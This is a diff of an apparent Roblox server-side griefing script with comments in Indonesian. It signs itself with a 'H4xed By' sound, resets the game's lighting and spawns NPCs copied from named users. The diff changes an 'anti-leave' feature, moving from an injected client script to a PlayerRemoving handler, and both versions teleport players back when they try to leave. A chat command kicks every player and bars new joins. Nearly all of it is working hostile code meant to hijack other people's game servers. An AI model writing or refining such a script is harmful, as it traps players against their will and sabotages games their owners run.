@@ -60,7 +60,7 @@ safe(function()
 	hint.Parent = workspace
 end)
 
--- Helper set tiap part
+-- 6. Helper functions
 local function setPart(char, name, pos, rotY, size)
 	local part = char:FindFirstChild(name)
 	if not part then return end
@@ -69,10 +69,10 @@ local function setPart(char, name, pos, rotY, size)
 	part.Anchored = true
 end
 
--- Helper destroy Motor6D & anchor semua
 local function breakJoints(char)
+	-- Hanya hapus Motor6D, biar aksesori tetap terpasang
 	for _, v in char:GetDescendants() do
-		if v:IsA("Motor6D") or v:IsA("JointInstance") then
+		if v:IsA("Motor6D") then
 			v:Destroy()
 		end
 	end
@@ -83,7 +83,7 @@ local function breakJoints(char)
 	end
 end
 
--- 6. NPC MY BROTHER (zeros7299)
+-- 7. NPC MY BROTHER (zeros7299)
 safe(function()
 	local id = P:GetUserIdFromNameAsync("zeros7299")
 	local desc = P:GetHumanoidDescriptionFromUserId(id)
@@ -108,11 +108,7 @@ safe(function()
 	end
 end)
 
--- 7. NPC YTZ_DEXZ (KHAFIDZKTP)
--- Right leg = mirror dari left leg relative ke torso
--- Torso: (-24.263, 10.333, 21.192)
--- Left leg offset: (-25.81-(-24.263), _, 20.109-21.192) = (-1.547, _, -1.083)
--- Right leg mirror: (-24.263+1.547, 2.777, 21.192+1.083) = (-22.716, 2.777, 22.275)
+-- 8. NPC YTZ_DEXZ (KHAFIDZKTP)
 safe(function()
 	local id = P:GetUserIdFromNameAsync("KHAFIDZKTP")
 	local desc = P:GetHumanoidDescriptionFromUserId(id)
@@ -137,82 +133,7 @@ safe(function()
 	end
 end)
 
--- 8. Anti-leave via RemoteEvent ke client
-safe(function()
-	local remote = Instance.new("RemoteEvent")
-	remote.Name = "AL"
-	remote.Parent = workspace
-
-	-- LocalScript source dikirim ke client via remote
-	local clientCode = [[
-		local TS = game:GetService("TeleportService")
-		local UIS = game:GetService("UserInputService")
-		local placeId = game.PlaceId
-		local active = true
-
-		UIS.MenuOpened:Connect(function()
-			if active then
-				active = false
-				task.wait(0.1)
-				TS:Teleport(placeId)
-			end
-		end)
-	]]
-
-	-- Inject LocalScript ke tiap player
-	for _, plr in P:GetPlayers() do
-		safe(function()
-			local sg = Instance.new("ScreenGui")
-			sg.ResetOnSpawn = false
-			sg.Name = "MoonAntiLeave"
-			sg.Parent = plr.PlayerGui
-
-			local ls = Instance.new("LocalScript")
-			ls.Source = clientCode
-			ls.Parent = sg
-		end)
-	end
-
-	-- Player baru juga dapat anti-leave
-	P.PlayerAdded:Connect(function(plr)
-		task.wait(1)
-		safe(function()
-			local sg = Instance.new("ScreenGui")
-			sg.ResetOnSpawn = false
-			sg.Name = "MoonAntiLeave"
-			sg.Parent = plr.PlayerGui
-
-			local ls = Instance.new("LocalScript")
-			ls.Source = clientCode
-			ls.Parent = sg
-		end)
-	end)
-end)
-
--- 9. Shutdown system
-local shutdownMode = false
-
-local function setupChat(plr)
-	plr.Chatted:Connect(function(msg)
-		if msg:lower() == "/shutdown" then
-			shutdownMode = true
-			if hint then hint.Text = "SERVER SHUTDOWN BY KHAFIDZKTP" end
-			for _, p in P:GetPlayers() do
-				safe(function() p:Kick("Server di-shutdown oleh KHAFIDZKTP") end)
-			end
-		end
-	end)
-end
-
-P.PlayerAdded:Connect(function(plr)
-	if shutdownMode then
-		plr:Kick("Server telah di-shutdown oleh KHAFIDZKTP")
-		return
-	end
-	setupChat(plr)
-end)
-
--- Lighting reset ke default
+-- 9. Lighting reset
 safe(function()
 	local L = game:GetService("Lighting")
 	L:ClearAllChildren()
@@ -232,7 +153,7 @@ safe(function()
 	sky.Parent = L
 end)
 
--- Sound global
+-- 10. Sound global
 safe(function()
 	local sound = Instance.new("Sound")
 	sound.Name = "H4xed By not4player214"
@@ -244,3 +165,40 @@ safe(function()
 	sound.Parent = workspace
 	sound:Play()
 end)
+
+-- 11. Anti-leave + Shutdown
+local shutdownMode = false
+local TS = game:GetService("TeleportService")
+local placeId = game.PlaceId
+
+local function setupChat(plr)
+	plr.Chatted:Connect(function(msg)
+		if msg:lower() == "/shutdown" then
+			shutdownMode = true
+			if hint then hint.Text = "SERVER SHUTDOWN BY KHAFIDZKTP" end
+			for _, p in P:GetPlayers() do
+				safe(function() p:Kick("Server di-shutdown oleh KHAFIDZKTP") end)
+			end
+		end
+	end)
+end
+
+P.PlayerRemoving:Connect(function(plr)
+	if shutdownMode then return end
+	task.wait(0.5)
+	safe(function()
+		TS:TeleportAsync(placeId, {plr})
+	end)
+end)
+
+P.PlayerAdded:Connect(function(plr)
+	if shutdownMode then
+		plr:Kick("Server telah di-shutdown oleh KHAFIDZKTP")
+		return
+	end
+	setupChat(plr)
+end)
+
+for _, plr in P:GetPlayers() do
+	setupChat(plr)
+end
